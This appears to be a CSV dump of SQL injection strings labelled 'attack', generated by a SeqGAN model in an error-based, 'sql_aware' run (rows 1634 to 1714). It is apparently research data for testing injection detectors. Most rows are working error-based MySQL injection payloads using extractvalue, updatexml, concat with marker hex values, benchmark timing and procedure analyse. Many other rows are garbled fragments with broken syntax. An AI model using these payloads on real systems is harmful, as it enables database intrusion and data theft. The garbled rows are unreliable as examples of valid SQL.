attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kNhfm",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1634
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1635
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1636
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1637
attack,"1%%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1638
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1639
attack,"1%1%""%z' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'ndSYAn",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1640
attack,"1%""   )    )     updatexml  (  (  9627(  (  0x5c,0x7171706a71,0x7171706a71,  (  (  benchmark  (  5000000(  0x2e,0x7171706a71(  (  benchmark  (  (  (  5000000,md5  (  (  (  (  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  (  select   (   SELECT duanal  )  )  e  )   from duade  elt  )  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  0x5c,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1641
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1642
attack,"1% or updatexml  (  (r  (  (  0x5c,  (  (  benchmark  (  (  benchmark  (  (  benchmark  (  l,md5  (  (  0x5c,  (  =  (  7982,concat  (  0x2e,0x7171706a71,  (  benchmark  (  (  9627,concat  (  (  (  3393,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  0x5c,0x7171706a71,1   (  l  x  (  1 a al  )  )  (  e(  elt  (  0x4b774c75   (  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1643
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1644
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'z",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1645
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1646
attack,1%%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1647
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1648
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1649
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1650
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1651
attack,"1%""   and extractvalue  (  (  (  (  (  (  (  (  (  (  (  3393  =  (  (  (  0x2e,concat  (  0x5c,0x7171706a71,  (  (  (  benchmark  (  (  (  5000000(  (  (  (  (  =  (  7982,1   )    (  extractvalue  (  3393,concat  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x2e,md5  (  select   (  elt  (  1808  =  (  (  0x2e,0x7171706a71,  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1652
attack," AND or updatexml  (  (  (  (  (  (  =  (  3393,1   )    (  extractvalue  (  select   (  elt  (  1 as a  l_inaddd   (  5603  (  el  (  0x5c,(  (  5000000(  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  3393,1   (  case FROM as dua  )  )   end  (  elt  (  elta  elt  (  e  (  1297  =  (  7982,1   )    (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1653
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1654
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1655
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1656
attack,"  =1 or updatexml  (  (  (  (  (  (  (  (  0x5c,0x7171706a71,_  (  (  (  5704  =  (  (  (  3393,concat  (  (  (  (  (  (  (  1724  (  =  (  3393,concat  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  5000000,md5  (  1808,1   )    AND 'i'  extractvalue  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  5000000(  (  0x2e,1   )    )     )  extractvalue  (  (  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1657
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1658
attack,"/  (  (  (  (  (  (  (  (  0x2e,0x7171706a71,4125  (  (  benchmark  9627,concat  (  (  (  (  0x5c,0x7171706a71,  (  (  (  select   (  2917  =  (  3393,1   from d0dual  )  )  4660  )   from dual  )  el  )  )  ,concatt  (  0x2e,0x7171706a71,  (  select   (  elt  (  elte  0x4b774c75   )    (    (  select   (  elt  e  ' like 'inalt  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1659
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1660
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1661
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1662
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1663
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1664
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""zU1M1%%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1665
attack," AND proceadde d2501  (  9788  )   (    (  0x5c,1   )    )     (  select   (  case int  (  1808  =  (  1808,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  (  select   (  5433  =  (  5704  =  (  (  3393,0,1   (  3576  =  extractvalue  (  (  9627,1   )    (  )  PAAextractvalue  (  select   (  elt  (  e  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1666
attack,"1%#xj)    AND 'i'  ,0x717a767a71   )    )    1354,8666  (  (  case extractvalue  (  (  (  3393,concat  (  (  3393  (  (  select   (  (  el  (  1297  =  3393,  (  select   (  1808,0x7171706a71,  (  select   (  elt  (  e  (  1297  =  (  (  9627,md5  (  (  =  (  (  7982  =  (  (  3393,1   (  extractvalue  (  9627,concat  (  (  (  0x2e,md5  (  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1667
attack,"6134'   )    )     )  extractvalue  (  (  3393,md5  (  (  0x2e,md5  (  0x4b774c75   (  (  5423  )   (  1724  (  5000000,md5  (  3393,1   )    (  extractvalue  (  (  3393,concat  (  (  (  0x2e,md5  (  (  (  0x2e,0x7171706a71,  (  select   (  benchmark  (  1297,md5  (  0x2e,md5  (  0x2e,md5  (  select   (  1297,0x7171706a71,  (  (  select   (  6581  =  (  8862,1   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1668
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1669
attack,"1%"",updatexml extractvalue  (  (  (  (  7982,1   )    (  select 5198  (  (  ~=  (  (  9836  =  (  1297,concat  (  =  (  (  2917  =  (  0x2e,0x7171706a71,  (  5000000(  (  select   (  elt  (  e  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  3393  =  (  1049  (  (  (  (  7982  =  (  select   (  elt  (  elt  (   )    (  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1670
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  "")      )    xyl.geta_host_naddre analyse  (  4660  (  (  elt  (  0x5c,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  0x2e,0x7171706a71,  (  benchmark  (  =  (  benchmark  (  (  9627,md5  (  0x2e,1   )    (  extractvalue  (  9627,,concat  (  (  (  (  0x5c,  (  (  select   (  (  elt  9393  =    (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1671
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""ol",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1672
attack,"1"" or updatexml  (  (  (  (  (  (  (  7982,0x7171706a71,  (  (  benchmark  (  (  (  (  selectl,md5  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  7982  =  3393  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  (  (  select   (  e  (  elt  (  elt  (  3393  =  (  (  0x5c,  (  (  =  7982,1   and  (  select extractvalue  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1673
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1674
attack,"1%'  =  'ppr'  =  'kpfogkkl6581)    )    AND 'i'  )  select   (  case when   (  5704  (  =  (  1297,1,updatexml  (    (  (  select   (  elt  (  e  (  (  0x5c,0x7171706a71,m5  (  (  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  select   (  (  elt  )  3393  (  =  (  (  select   (  el  (  0x2e,  (  (  select   (  elt  (  e  (  1808  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1675
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1676
attack,1%'  =  'b'  =  ''  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1677
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1678
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""y mw'  =  'ynannan"" like ""ygznh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1679
attack,"1% or'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ' jqi)sjnc",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1680
attack,"1%""   )    uszlysm",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1681
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'jf'  =  '$ncjlganetnag0x4b774c75   )    )     )  (  extractvalue  (  (  5000000,md5  (  (  1 as d5  (  elt  (  5000000,md5  (  (  0x2e,m5  (  3863  (  (  (  3393,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1297  (  =  (  (  (  0x5c,0x7171706a71,  (  select   (  elte  4415  =  (  4688  =    (  (  (  2917  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1682
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1683
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1684
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'gk'  =  'nn"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""Amhmv7151"" like ""
'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '
pph0x7171706a710x7171706a71) from inal  =  (  (  (  0x52515a50   (  6581  (  3393  (  1808,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  e  (  benchmark  (  (  5433  (  (  0x2e,0x7171706a71,  (  0x5c,0x7171706a71,  (  (  benchmark  (  2917,concat  (  (  0x5c,  (  benchmark  (  (  (  benchmark  (  (  5000000(  (  extractvalue  (  =  (  9627,md5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1685
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1686
attack," 7757  (  select   (  6560  =  5847  (  3393,1   )    (  extractvalue  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  a  )  =  9788,1   (  from from,  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  5000000,md5  (  (  1 a  (  elt  1297  =  (  (  1297,concat  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1687
attack,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'phf",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1688
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1689
attack,"1% procedu.anenal  )  (  (  1297  =  (  (    (  0x2e,0x7171706a71,  (  benchmark  (  select   (  elt  (  e  (  1297  =  (  (  (  select   (  elt  )  (  2917  =    (  (  (  benchmark  (  (  (  1808  =  (  8862,1   (  case 'i'  =  'ina  )  extractvalue  (  9836  9103,concat  (  (  (  select   (  6581  =  (  (  7744  )  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1690
attack," AND and extractvalue  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  1808  4125  )  (  (  0x5c,  (  benchmark  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  benchmark  (  benchmark0  (  elt  (  elt  (  0x2e,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  elt  (  e  (  (  0x5c,0x7171706a71,  benchmark  (  5000000,md5  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1691
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1692
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1693
attack,"1 or updatexml  (  (  0x5c,  (  benchmark  (  (  (  (  (  (  (  select   (  (   (  5198  (  (  elt  (  1808  =  (  7982,1   )    u d5  (  select   (  6166 1    =  (  z  1 updatexml  (  (  (  =  (  3393,md5  (  1808,1   )    (  1724  =  8860  =  2162    )  select   (  updatexml  (  (  (  (  0x5c,0x7171706a71,  (  3393,md5  (  0x2e,m",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1694
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1695
attack,",mAND int  )  select 0 int  (  1808  =  (  (  7982  =  (  (  (  select   (  elt  (  elt  (  et  (  3393  =  (  select   (  elt  (  elt  (  0x5c,  (  select   (  elt  (  elt  9350  (  0x2e,0x7171706a71,  (  7982,concat  (  (  0x2e,concat  (  =  (  1759(  (  3393,concat  (  0x5c,0x7171706a71,  (  benchmark  (  (  5000000(  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1696
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1697
attack,"1%'  =  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1698
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1699
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kkAND",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1700
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1701
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1702
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1703
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1704
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'k'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1705
attack,"1%"" proce ananalyse  (  5322   (  ual  )  )   and else 0 0 ase  (  elt  (  el  (  (  select   (  )  elt  (  e  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  ute  l  (  7982  =  (  (  9675  (  3393,md5  (  (  0x5c,  (  (  select   (  elt  (  elt  (  2768  =  3393,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1706
attack,"1% where and updatexml  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  (  1759(  (  0x2e,concat  (  (  0x5c,  (  select   (  )   (  1812 0 dual  )  )  )   end  (  (  case 0 d,  (  e(  el duan  el  (  1297  =  (  3393,concat  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  elt  (  3393  =  (  (  0x5c,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1707
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1708
attack,"1%""   )    (  extractvalue  (  (  (  1297,concat  (  (  (  (  0x2e(  =  (  (  (  3393,concat  (  0x2e,md5  (  (  0x4b774c75   (  (  e  (  elt  (  1808  =  (  2501  =  (  (   (  (  (  elt  (  e  (  0x4b774c75   )    (    (  9627,md5  (  0x5c,0x7171706a71,  (  select   (  4660  =  (  (  1808  =  (  1808,concat  (  (  (  (  1297,concat  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1709
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1710
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1711
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1712
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'ekpnci'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1713
attack,"select   (  3576  =  '  (  1 updatexml  (  (  3393,md5  (  (  2917  =  (  (  3393,1   )    u USSRAL else cast  (  1759  (  select   (  5322  (  3393,1   )    (  select   (  5433  extractvalue  (  (  (  (  6804  =  =  (  9627,concat  (  (  =  (  3393,1   (  extractvalue  (  (  4415  (  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  benchmark  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1714
